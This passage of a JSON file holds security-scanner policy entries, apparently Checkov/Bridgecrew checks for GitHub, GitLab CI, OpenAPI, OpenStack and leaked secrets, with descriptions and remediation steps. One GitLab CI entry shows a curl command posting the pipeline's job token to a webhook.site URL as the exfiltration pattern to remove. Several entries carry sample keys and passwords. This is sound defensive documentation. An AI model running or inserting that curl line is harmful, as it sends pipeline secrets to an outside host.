        "description": "GitHub repository webhooks do not use HTTPs\nDescription\nWebhooks can be configured to use endpoints of your choosing, including whether TLS is enabled or not. Ensure you are using a webhook endpoint with encryption by using a standard HTTPS URL.\nFix - Buildtime\nTerraform\n\nResource: github_repository_webhook\nAttribute: insecure_ssl\n\nGoresource \"github_repository_webhook\" \"foo\" {\n...\n  configuration {\n-    url          = \"http://google.com/\"\n+    url          = \"https://google.com/\"\n-    insecure_ssl = false\n+    insecure_ssl = false\n  }\n\n}\n",
        "severity": "MEDIUM"
    },
    "CKV_GITHUB_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-organization-webhooks-are-using-https",
        "description": "GitHub organization webhooks do not use HTTPs\nDescription\nWebhooks can be configured to use endpoints of your choosing, including whether TLS is enabled or not. Ensure you are using a webhook endpoint with encryption by using a standard HTTPS URL.",
        "severity": "MEDIUM"
    },
    "CKV_GITHUB_8": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-rules-requires-linear-history",
        "description": "GitHub branch protection rules do not require linear history\nDescription\nEnsure your team uses strictly linear history with squash merges and rebase merge to make development easier. If your organization allows squash merge or rebase merge, then you can enable linear history from the branch protection menu.\n",
        "severity": "LOW"
    },
    "CKV_GITHUB_10": {
        "url": "https://docs.bridgecrew.io/docs/ensure-branch-protection-rules-are-enforced-on-administrators",
        "description": "GitHub branch protection rules are not enforced on administrators\nDescription\nBy default, branch protection rules do not apply to admins. This allows admins to bypass many of the safeguards put in place and thus makes them and their accounts a higher liability. Enforce branch protection rules for admins to ensure safeguards are in place for all users.\n",
        "severity": "LOW"
    },
    "CKV_GITLABCI_1": {
        "url": "https://docs.bridgecrew.io/docs/suspicious-use-of-curl-with-ci-environment-variables-in-script",
        "description": "Ensure that there are no suspicious uses of curl with CI environment variables in script\nDescription\nUsing curl with environment variables could be an attempt to exfiltrate secrets from a pipeline. Investigate if the use of curl is appropriate and secure.\nExample Fix\nBlock code and remove code that attempts to exfiltrate secrets.\nYAMLdeploy:\n-  script: 'curl -H \\\"Content-Type: application/json\\\" -X POST --data \"$CI_JOB_JWT_V1\" https://webhook.site/4cf17d70-56ee-4b84-9823-e86461d2f826'\n",
        "severity": "LOW"
    },
    "CKV_GITLABCI_2": {
        "url": "https://docs.bridgecrew.io/docs/avoid-creating-rules-that-generate-double-pipelines",
        "description": "Ensure that rules don't generate double pipelines\nDescription\nThe use of multiple trigger rules in a CI configuration file can lead to duplicate pipelines running. For example, if there is a trigger for every push and a trigger for merge request events, both triggers could be true and thus create two pipelines.\nExample Fix\nTry to keep the number of trigger sources down to one\nYAMLplanOnlySubset:\n  script: echo \"This job creates double pipelines!\"\n  rules:\n    - changes:\n        - $DOCKERFILES_DIR/*\n    - if: $CI_PIPELINE_SOURCE == \"push\"\n-    - if: $CI_PIPELINE_SOURCE == \"merge_request_event\"\n",
        "severity": "LOW"
    },
    "CKV_GITHUB_11": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-dismisses-stale-review-on-new-commit",
        "description": "GitHub branch protection does not dismiss stale reviews\nDescription\nBy default, PR reviews remain when a new commit is pushed. However, a commit can bring things out of compliance. Dismissing reviews after a commit ensures reviews are still relevant.",
        "severity": "LOW"
    },
    "CKV_GITHUB_12": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-restricts-who-can-dismiss-pr-reviews-cis-115",
        "description": "GitHub branch protection does not restrict who can dismiss a PR\nDescription\nDismissing a pull request review allows you to dismiss irrelevant or outdated reviews. However, this also allows blocking reviews to be dismissed. Branch protection rules allow you to restrict who can dismiss reviews to a limited subset of users or teams.",
        "severity": "LOW"
    },
    "CKV_GITHUB_13": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-requires-codeowner-reviews",
        "description": "GitHub branch protection does not require code owner reviews\nDescription\nBranch protections can require code owner reviews for code changes. This means that pull requests must have approval from a code owner before merging.",
        "severity": "LOW"
    },
    "CKV_GITHUB_14": {
        "url": "https://docs.bridgecrew.io/docs/ensure-github-branch-protection-requires-status-checks",
        "description": "GitHub branch protection does not require status checks\nDescription\nRequiring status checks means that all required CI jobs must pass for code to be merged. This is especially important when your status checks include security reviews that must pass before merging the code. This requirement can be found in the branch protection policies of your repository.",
        "severity": "LOW"
    },
    "CKV_OPENAPI_6": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-security-requirement-defined-in-securitydefinitions",
        "description": "Security requirement not defined in the security definitions\nDescription\nSecurity definitions in the security section of a path or root should refer to an authentication scheme identified in the securityDefinitions section.\nFix - Buildtime\nOpenAPI\nExample:\nYAML...\nsecurity:\n  - petstore_auth:\n      - write:pets\n      - read:pets\n...\n+ petstore_auth:\n+    type: oauth2\n+    authorizationUrl: http://swagger.io/api/oauth/dialog\n+    flow: implicit\n+    scopes:\n+      write:pets: write\n+      read:pets: read\n",
        "severity": "HIGH"
    },
    "CKV_OPENAPI_3": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-security-schemes-dont-allow-cleartext-credentials-over-unencrypted-channel",
        "description": "Security scheme allows cleartext credentials over unencrypted channels\nDescription\nSending credentials over HTTP in cleartext expose your API calls to man-in-the-middle attacks among others. Ensure that you are using an encrypted channel for sending credentials.\nFix - Buildtime\nOpenAPI\nEnsure that you aren't using the unencryptedScheme. For example:\nYAMLcomponents:\n  securitySchemes:\n-    unencryptedScheme:\n-      type: http\n-      scheme: basic\n+    encryptedScheme:\n+      type: oauth2\npaths:\n  \"/\":\n    get:\n      security:\n-        - unencryptedScheme: []\n+        - encryptedScheme:\n+            - write\n+            - read\n",
        "severity": "HIGH"
    },
    "CKV_OPENAPI_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-the-global-security-field-has-rules-defined",
        "description": "Security object needs to have defined rules in its array and rules should be defined in the securityScheme\nDescription\nOpenAPI uses security schemes to reference authentication and authorization schemes. Your APIs should have authentication schemes in place and documented in the OpenAPI specification, as well as applied to individual operations or the whole API in the security details.\nFix - Buildtime\nOpenAPI\nEnsure that you have a securityScheme component and application. For example:\nYAMLcomponents:\n+  securitySchemes:\n+    basicAuth:\n+      type: http\n+      scheme: basic\n\nsecurity:\n+  - basicAuth: []\n",
        "severity": "HIGH"
    },
    "CKV_OPENAPI_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-security-operations-is-not-empty",
        "description": "Security object for operations, if defined, must define a security scheme, otherwise it should be considered an error\nDescription\nThe security section of the operation path applies an authentication method to that operation. Leaving it blank implies an exposed API without authentication.\nFix - Buildtime\nOpenAPI\nEnsure that you have an authentication type in the security section of your path. For example:\nYAMLpaths:\n  \"/\":\n    get:\n      operationId: id\n      summary: example\n-     security: []\n+     security:\n+       - OAuth2:\n+           - write\n",
        "severity": "HIGH"
    },
    "CKV_OPENSTACK_3": {
        "url": "https://docs.bridgecrew.io/docs/bc_openstack_networking_2",
        "description": "OpenStack Security groups allow ingress from 0.0.0.0:0 to port 3389 (tcp / udp)\nDescription\nIn OpenStack, firewall rules are used to allow or deny traffic to or from a specific network or subnet. When you create a firewall rule, you can specify the destination IP address or range that the rule applies to. This allows you to control which traffic is allowed or denied based on the destination IP of the traffic.\nFix - Buildtime\nTerraform\n\nResource: openstack_compute_secgroup_v2\nArguments: rule.to_port + rule.from_port \n\nGoresource \"openstack_compute_secgroup_v2\" \"secgroup_1\" {\n          name        = \"my_secgroup\"\n          description = \"my security group\"\n        \n          rule {\n            from_port     = 3389\n            to_port       = 3389\n            ip_protocol   = \"tcp\"\n            from_group_id = \"5338c192-5118-11ec-bf63-0242ac130002\"\n          }\n        }\n",
        "severity": "LOW"
    },
    "CKV_OPENAPI_1": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-securitydefinitions-is-defined-and-not-empty",
        "description": "OpenAPI securityDefinitions is not defined or is empty\nDescription\nsecurityDefinitions in OpenAPI/Swagger 2.0 files allow you to define the authentication types that your API supports. Having no authentication exposes your APIs to attacks and having no documented authentication type makes it more difficult to understand accessing your API.\nFix - Buildtime\nOpenAPI\nEnsure that your OpenAPI 2.0 spec includes a securityDefinitions section. For example:\nYAMLsecurityDefinitions:\n  BasicAuth:\n    type: basic\n  ApiKeyAuth:\n    type: apiKey\n    in: header\n    name: apiKey\n  OAuth2:\n    type: oauth2\n    flow: implicit\n    authorizationUrl: https://swagger.io/api/oauth/dialog\n    tokenUrl: https://swagger.io/api/oauth/token\n    scopes:\n      read: read\n      write: write \n",
        "severity": "HIGH"
    },
    "CKV_OPENAPI_2": {
        "url": "https://docs.bridgecrew.io/docs/ensure-that-if-the-security-scheme-is-not-of-type-oauth2-the-array-value-must-be-empty",
        "description": "Ensure that if the security scheme is not of type 'oauth2', the array value must be empty\nDescription\nOnly OAuth 2.0 defined in the securityDefinitions section should have a value in the security section.\nFix - Buildtime\nOpenAPI\nEnsure that your generated OpenAPI document does not include a security section for authentication types that are not OAuth 2.0. Below is an example:\nYAMLsecurityDefinitions:\n  some_auth:\n    type: basic\n- security:\n-  - some_auth:\n-      - write: some\n-      - read: some\n",
        "severity": "HIGH"
    },
    "CKV_OPENSTACK_4": {
        "url": "https://docs.bridgecrew.io/docs/ensure-openstack-instance-does-not-use-basic-credentials",
        "description": "OpenStack instance uses basic credentials\nDescription\nWhen managing a compute instance in Terraform, you can override the root password using admin_pass. However, this is stored in plaintext and therefore exposes the root password to credential theft.\nFix - Buildtime\nTerraform\n\nResource: openstack_compute_instance_v2\nArguments: admin_pass\n\nGoresource \"openstack_compute_instance_v2\" \"fail\" {\n  name            = \"basic\"\n  image_id        = \"ad091b52-742f-469e-8f3c-fd81cadf0743\"\n  flavor_id       = \"3\"\n-  admin_pass      = \"N0tSoS3cretP4ssw0rd\"\n  security_groups = [\"default\"]\n  user_data       = \"#cloud-config\\nhostname: instance_1.example.com\\nfqdn: instance_1.example.com\"\n\n  network {\n    name = \"my_network\"\n  }\n}\n",
        "severity": "LOW"
    },
    "CKV_OPENSTACK_5": {
        "url": "https://docs.bridgecrew.io/docs/ensure-openstack-firewall-rule-has-destination-ip-configured",
        "description": "OpenStack firewall rule does not have destination IP configured\nDescription\nExplicitly setting a destination IP Address will make sure that the IP destination is managed in code. You also need to ensure that the destination IP is not 0.0.0.0 so that the firewall rule is exposed to the world.\nFix - Buildtime\nTerraform\n\nResource: openstack_fw_rule_v1\nArguments: destination_ip_address\n\nGoresource \"openstack_fw_rule_v1\" \"fail\" {\n  name             = \"my_rule_world\"\n  description      = \"let anyone in\"\n  action           = \"allow\"\n  protocol         = \"tcp\"\n  destination_port = \"22\"\n  enabled          = \"true\"\n+  destination_ip_address = \"10.0.0.1\"\n}\n\nCLI\nopenstack firewall group rule create --destination-ip-address 10.0.0.1\n",
        "severity": "LOW"
    },
    "CKV_SECRET_77": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_77",
        "description": "MongoDB Connection String\nDescription\nMongoDB is a document-oriented database program. This policy detects MongoDB credentials in the form of URI connection strings.\nExample:\nTextvar mongo_uri = \"mongodb+srv://testuser:[email\u00a0protected]/test?retryWrites=true&w=majority\"\n\nFix - Buildtime\nMongoDB\nRevoking a MongoDB connection string means invalidating or disabling the credentials used to connect to a MongoDB instance. This can be done in several ways depending on the method used to authenticate and the specific setup of your MongoDB environment.\nIf you're using MongoDB's built-in authentication mechanism, you can revoke a connection string by revoking the user's privileges. This can be done using the following steps:\n\nConnect to the MongoDB instance using a user account with administrative privileges.\nUse the db.revokeRolesFromUser() command to remove the user's roles. For example, if the user's name is myUser and they have the readWrite role on the myDatabase database, you would run the following command:\n\nPHPdb.revokeRolesFromUser(\"myUser\", [{role: \"readWrite\", db: \"myDatabase\"}])\n\n\nAlternatively, you can also use the db.dropUser() command to completely delete the user account.\n\nIf you're using an external authentication mechanism, such as LDAP or Kerberos, you'll need to consult the documentation for that mechanism to find out how to revoke credentials.\nIt's worth noting that revoking a connection string is only effective for future connections. Any existing connections will remain valid until they are closed or expire. If you need to immediately terminate all active connections, you can restart the MongoDB instance or use the db.killOp() command to kill specific operations.",
        "severity": "LOW"
    },
    "CKV_SECRET_9": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_9",
        "description": "JSON Web Token\nDescription\nJSON Web Tokens are an open, industry standard RFC 7519 method for representing claims securely between two parties.\nOnce issued, access tokens and ID tokens cannot be revoked in the same way as cookies with session IDs for server-side sessions. As a result, tokens should be issued for relatively short periods, and then refreshed periodically if the user remains active.\nFix - Buildtime\nMultiple Services\nStep 1: Reduce duration.\nThe most common solution is to reduce the duration of the JWT and revoke the refresh token so that the user can\u2019t generate a new JWT.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Check your application access logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_4": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_4",
        "description": "Basic Auth Credentials\nDescription\nBasic authentication is a simple authentication scheme built into the HTTP protocol. The client sends HTTP requests with the Authorization header that contains the word Basic word followed by a space and a base64-encoded string username:password. Leaked usernames and password can be used by attackers to attempt to authenticate to existing accounts and steal information they hold. \nFix - Buildtime\nMultiple Services\nStep 1: Revoke the exposed secret.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Inspect your application's access logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_80": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_6",
        "description": "Base64 High Entropy Strings\nDescription\nEntropy checks help detect unstructured secrets by measuring the entropy level of a single string. Entropy is a concept used to assign a numerical score to how unpredictable a password is or the likelihood of highly random data in a string of characters. Strings with a high entropy score are flagged as suspected secrets.\nFix - Buildtime\nMultiple Services\nStep 1: Revoke the exposed secret.\nStart by understanding what services were impacted and refer to the corresponding API documentation to learn how to revoke and rotate the secret.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Check any relevant access logs to ensure the key was not utilized during the compromised period.\nFix - Terraform\nGoresource \"aws_glue_connection\" \"examplevpc\" {\n  connection_properties = {\n    JDBC_CONNECTION_URL = \"jdbc:mysql://${aws_rds_cluster.example.endpoint}/exampledatabase\"\n -   PASSWORD            = \"valuethatdoesntcontainsecretword\"\n    USERNAME            = \"exampleusername\"\n  }\n\n  name = \"example\"\n\n  physical_connection_requirements {\n    availability_zone      = aws_subnet.example.availability_zone\n    security_group_id_list = [aws_security_group.example.id]\n    subnet_id              = aws_subnet.example.id\n  }\n}\n\nDon't hardcode the secret in the resource, pull in dynamically from a secret source of your choice e.g. AWS parameter store, and if already committed to source follow the git instructions stated previously.",
        "severity": "LOW"
    },
    "CKV_SECRET_11": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_11",
        "description": "Mailchimp Access Key\nDescription\nThis check detects a Mailchimp access key referenced in your source code. The key enables an authenticated user to perform operational and management activities exposed by Mailchimp's developer API service. \nFix - Buildtime\nMailchimp\nStep 1: Revoke Secret.\nAn activated API Key can be deactivated from the Mailchimp dashboard under the Extras/API Key tab.\n\nGo to https://us1.admin.mailchimp.com/account/api/ to open the API Keys section of your account.\nFind the API key you want to disable, and toggle the slider in the Status column for that API key.\nFind the API key you want to disable and click Disable.\nIn the pop-up modal, click Disable.\n\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Check the API calls logs in the Mailchimp dashboard to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_12": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_12",
        "description": "NPM Token\nDescription\nThe NPM access token can be used to authenticate to npm when using the API or the npm command-line interface (CLI). An access token is a hexadecimal string that you can use to authenticate, and which gives you the right to install and/or publish your modules.\nFix - Buildtime\nNPM\nStep 1: Revoke Secret.\n\nTo see a list of your tokens, on the command line, run:\n\nnpm token list\n\n\nIn the tokens table, find and copy the ID of the token you want to delete. On the command line, run the following command, replacing 123456 with the ID of the token you want to delete:\n\nnpm token delete 123456\nnpm will report Removed 1 token\n\n\nTo confirm that the token has been removed, run:\n\nnpm token list\n\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.",
        "severity": "LOW"
    },
    "CKV_SECRET_1": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_1",
        "description": "Artifactory Credentials\nDescription\nArtifactory is a Repository Manager that functions as a single access point organizing all of your binary resources including proprietary libraries, remote artifacts and other 3rd party resources.\nTextapikey: AKCp5budTFpbypBqQbGJPz3pGCi28pPivfWczqjfYb9drAmd9LbRZbj6UpKFxJXA8ksWGc9fM\n\nFix - Buildtime\nArtifactory\nStep 1: Revoke the exposed secret.\nThe key can be revoked from the user profile or through the API.\nText## Revoke API Key\nDescription: Revokes the current user's API key\nSince: 4.3.0\nUsage: DELETE /api/security/apiKey\nProduces: application/json\n\n## Revoke User API Key\nDescription: Revokes the API key of another user\nSince: 4.3.0\nSecurity: Requires a privileged user (Admin only)\nUsage: DELETE /api/security/apiKey/{username} \nProduces: application/json\n\n## Revoke All API Keys\nDescription: Revokes all API keys currently defined in the system\nSince: 4.3.0\nSecurity: Requires a privileged user (Admin only)\nUsage: DELETE /api/security/apiKey?deleteAll={0/1} \nProduces: application/json\n\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Inspect Jfrog access logs to ensure the key was not utilized durring the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_2": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_2",
        "description": "AWS Access Keys\nDescription\nAWS Access Keys are long-term credentials for an IAM user or the AWS account root user. You can use access keys to sign programmatic requests to the AWS CLI or AWS API (directly or using the AWS SDK).\nAccess keys consist of two parts: an access key ID (for example, AKIAIOSFODNN7EXAMPLE) and a secret access key (for example, wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY).\nFix - Buildtime\nAWS\nStep 1: Revoke the exposed secret.\n\nSign in to the AWS Identity and Access Management (IAM) console as the root user.\nChoose your account name on the navigation bar, and then choose My Security Credentials.\nIf you see a warning about accessing the security credentials, choose Continue to security credentials.\nExpand the Access keys (access key ID and secret access key) section.\nChoose Delete next to the access key that you want to delete.\nIn the confirmation box, choose Yes.\n\nExpand the \"Access keys\" section then click on the delete button.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Inspect AWS CloudTrail access logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_8": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_8",
        "description": "IBM COS HMAC Credentials\nDescription\nIBM Cloud object storage (COS) is a format for storing unstructured data in the cloud.\nHMAC credentials consist of an Access Key and Secret Key paired for use with S3-compatible tools and libraries that require authentication.\nThe IBM Cloud Object Storage API is a REST-based API for reading and writing objects. It uses IBM Cloud Identity and Access Management for authentication and authorization, and supports a subset of the S3 API for easy migration of applications to IBM Cloud.\nFix - Buildtime\nIBM Cloud\nStep 1: Revoke the exposed secret.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Check IBM Cloud Object Storage Accesser server logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_3": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_3",
        "description": "Azure Storage Account Access Keys\nDescription\nWhen you create a storage account, Azure generates two 512-bit storage account access keys. These keys can be used to authorize access to data in your storage account via Shared Key authorization. Leaking this key can thus compromise the concerned data.\nFix - Buildtime\nAzure\nStep 1: Revoke the exposed secret.\nTo revoke a user delegation SAS, revoke the user delegation key to quickly invalidate all signatures associated with that key. To revoke a service SAS that is associated with a stored access policy, you can delete the stored access policy, rename the policy, or change its expiry time to a time that is in the past.\nTextPOST https://management.azure.com/subscriptions/{subscriptionId}/resourceGroups/{resourceGroupName}/providers/Microsoft.Storage/storageAccounts/{accountName}/revokeUserDelegationKeys?api-version=2021-04-01\n\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Inspect Azure Activity Logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_5": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_5",
        "description": "Cloudant Credentials\nDescription\nCloudant is a document-oriented and distributed database running on IBM Cloud. The service can be accessed via API calls. An optional authentication method requires a username and password. An alternate authentication method consists of a username and the corresponding apikey.\nFix - Buildtime\nCloudant\nStep 1: Revoke the exposed secret.\nThe secret can be revoked from the IBM Cloudant dashboard in the Service credentials tab.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Inspect LogDNA logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_6": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_6",
        "description": "Base64 High Entropy Strings\nDescription\nEntropy checks help detect unstructured secrets by measuring the entropy level of a single string. Entropy is a concept used to assign a numerical score to how unpredictable a password is or the likelihood of highly random data in a string of characters. Strings with a high entropy score are flagged as suspected secrets.\nFix - Buildtime\nMultiple Services\nStep 1: Revoke the exposed secret.\nStart by understanding what services were impacted and refer to the corresponding API documentation to learn how to revoke and rotate the secret.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Check any relevant access logs to ensure the key was not utilized during the compromised period.\nFix - Terraform\nGoresource \"aws_glue_connection\" \"examplevpc\" {\n  connection_properties = {\n    JDBC_CONNECTION_URL = \"jdbc:mysql://${aws_rds_cluster.example.endpoint}/exampledatabase\"\n -   PASSWORD            = \"valuethatdoesntcontainsecretword\"\n    USERNAME            = \"exampleusername\"\n  }\n\n  name = \"example\"\n\n  physical_connection_requirements {\n    availability_zone      = aws_subnet.example.availability_zone\n    security_group_id_list = [aws_security_group.example.id]\n    subnet_id              = aws_subnet.example.id\n  }\n}\n\nDon't hardcode the secret in the resource, pull in dynamically from a secret source of your choice e.g. AWS parameter store, and if already committed to source follow the git instructions stated previously.",
        "severity": "LOW"
    },
    "CKV_SECRET_7": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_7",
        "description": "IBM Cloud IAM Key\nDescription\nThe IBM Cloud Identity and Access Management (IAM) service manages keys that can give access to infrastructure API and to resources.\nFix - Buildtime\nIBM Cloud\nStep 1: Revoke the exposed secret.\nTo delete an API key, complete the following steps:\n\nIn the console, go to Manage > Access (IAM) > API keys.\nIdentify the row of the API key that you want to delete, and select Delete from the Actions List of actions icon menu.\nThen, confirm the deletion by clicking Delete.\n\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Check any relevant access logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_13": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_13",
        "description": "Private Key\nDescription\nThis check detects private keys by determining whether commonly specified key attributes are present in the analyzed string.\nDSA PRIVATE KEY\nEC PRIVATE KEY\nOPENSSH PRIVATE KEY\nPGP PRIVATE KEY BLOCK\nPRIVATE KEY\nRSA PRIVATE KEY\nSSH2 ENCRYPTED PRIVATE KEY\nPuTTY-User-Key-File-2\n\nFix - Buildtime\nMultiple Services\nStep 1: Revoke the exposed secret.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Inspect your application's access logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_14": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_14",
        "description": "Slack Token\nDescription\nSlack API tokens can be created for both members and bot users. For added security, it is recommended to rotate these tokens periodically. Slack will automatically revoke old tokens if they remain unused for long periods of time.\nFix - Buildtime\nSlack\nStep 1: Revoke the exposed secret.\nGo to auth.revoke to revoke your token.\nMethod URL:\thttps://slack.com/api/auth.revoke\nPreferred HTTP method:\tGET\nAccepted content types:\tapplication/x-www-form-urlencoded\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Inspect Slack's Events API log to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_15": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_15",
        "description": "SoftLayer Credentials\nDescription\nSoftLayer Technologies, Inc. (now IBM Cloud) was a dedicated server, managed hosting, and cloud computing provider, founded in 2005 and acquired by IBM in 2013. SoftLayer initially specialized in hosting workloads for gaming companies and startups, but shifted focus to enterprise workloads after its acquisition.\nFix - Buildtime\nIBM Cloud\nStep 1: Revoke the exposed secret.\nStep 2: Clean the git history.\nStep 3: Inspect IBM Cloud logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_16": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_16",
        "description": "Square OAuth Secret\nDescription\nThe Square OAuth API uses the OAuth 2 protocol to get permission from the owner of the seller account to manage specific types of resources in that account.\nFix - Buildtime\nSquare\nStep 1: Revoke the exposed secret.\nPOST /oauth2/revoke: Revokes an access token generated with the OAuth flow.\nIf an account has more than one OAuth access token for your application, this endpoint revokes all of them, regardless of which token you specify. When an OAuth access token is revoked, all of the active subscriptions associated with that OAuth token are canceled immediately.\nReplace APPLICATION_SECRET with the application secret on the OAuth page in the developer dashboard.\nTextAuthorization: Client APPLICATION_SECRET\n\nStep 2: Clean the git history.",
        "severity": "LOW"
    },
    "CKV_SECRET_17": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_17",
        "description": "Stripe Access Key\nDescription\nStripe authenticates your API requests using your account\u2019s API keys. If you do not include your key when making an API request, or use one that is incorrect or outdated, Stripe returns an error.\nSecret API keys should be kept confidential and only stored on your own servers. Your account\u2019s secret API key can perform any API request to Stripe without restriction.\nFix - Buildtime\nStripe\nStep 1: Revoke the exposed secret.\nUsers with Administrator permissions can access a Stripe account\u2019s API keys by navigating to the Developers section of the Stripe dashboard and clicking on API Keys.\nIf you no longer need a restricted key (or you suspect it has been compromised), you can revoke it at any time. You can also edit the key to change its level of access.\nStep 2: Clean the git history.",
        "severity": "LOW"
    },
    "CKV_SECRET_18": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_18",
        "description": "Twilio Access Key\nDescription\nTwilio Access Tokens are short-lived tokens that you can use to authenticate Twilio Client SDKs like Voice, Conversations, Sync, and Video.\nYou create them on your server to verify a client\u2019s identity and grant access to client API features. All tokens have a limited lifetime, configurable up to 24 hours. However, a best practice is to generate Access Tokens for the shortest amount of time feasible for your application.\nFix - Buildtime\nTwilio\nStep 1: Revoke the exposed secret.\nThe following method deletes an API Key. This revokes its authorization to authenticate to the REST API and invalidates all Access Tokens generated using its secret.\nIf the delete is successful, Twilio will return an HTTP 204 response with no body.\nTextDELETE https://api.twilio.com/2010-04-01/Accounts/{AccountSid}/Keys/{Sid}.json\n\nStep 2: Clean the git history.",
        "severity": "LOW"
    },
    "CKV_SECRET_19": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_19",
        "description": "Hex High Entropy String\nDescription\nPassword Entropy is a concept used to assign a numerical score to how unpredictable a password is or the likelihood of highly random data in a string of characters. The policy calculates entropy levels using a Shannon Entropy calculator. The entropy levels of keys are important, as the more or less information required to determine unknown key variables can alter how difficult it is to crack. If a high-entropy string is detected, the string is printed to the screen.\nThis check scans the branch and evaluates the entropy for both the hexadecimal character set for every blob of text.\nFix - Buildtime\nMultiple Services\nStep 1: Revoke the exposed secret.\nStart by understanding what services were impacted and refer to the corresponding API documentation to learn how to revoke and rotate the secret.\nStep 2: Clean the git history.\nGo under the settings section of your GitHub project and chose the change visibility button at the bottom.\nStep 3: Check any relevant access logs to ensure the key was not utilized during the compromised period.",
        "severity": "LOW"
    },
    "CKV_SECRET_44": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_44",
        "description": "GitLab Token\nDescription\nPersonal access tokens can be an alternative to OAuth2 and used to:\n\nAuthenticate with the GitLab API.\nAuthenticate with Git using HTTP Basic Authentication.\nIn both cases, you authenticate with a personal access token in place of your password.\n\nPersonal access tokens are:\n\nRequired when two-factor authentication (2FA) is enabled.\nUsed with a GitLab username to authenticate with GitLab features that require usernames. For example, GitLab-managed Terraform state backend and Docker container registry,\nSimilar to project access tokens and group access tokens, but are attached to a user rather than a project or group.\n\nFix - Buildtime\nGitLab\n\nIn the top-right corner, select your avatar.\nSelect Edit profile.\nOn the left sidebar, select Access Tokens.\nIn the Active personal access tokens area, next to the key, select Revoke.\n",
        "severity": "LOW"
    },
    "CKV_SECRET_24": {
        "url": "https://docs.bridgecrew.io/docs/git_secrets_24",
        "description": "Asana Key\nAsana is a web and mobile work management[2] platform designed to help teams organize, track, and manage their work. It helps teams manage projects and tasks in one tool. Teams can create projects, assign work to teammates, specify deadlines, and communicate about tasks directly in Asana. It also includes reporting tools, file attachments, calendars, as well as setting and tracking company wide goals.\nDescription\nA user can create many, but not unlimited, personal access tokens. When creating a token you must give it a description to help you remember what you created the token for. Personal Access Tokens should be used similarly to OAuth access tokens when accessing the API, passing them in the Authorization header. You can generate a Personal Access Token from the Asana developer console. See the Authentication Quick Start for detailed instructions on getting started with PATs.\nFix - Buildtime\nAsana\nAn authorization token can be deauthorized or invalidated by making a request to Asana's API. Your app should make a POST request to https://app.asana.com/-/oauth_revoke, passing the parameters as part of a standard form-encoded post body.\nThe body should include a valid Refresh Token, which will cause the Refresh Token and any Associated Bearer Tokens to be deauthorized. Bearer Tokens are not accepted in the request body since a new Bearer Token can always be obtained by reusing an authorized Refresh Token.",
        "severity": "LOW"
    },
    "CKV_SECRET_25": {
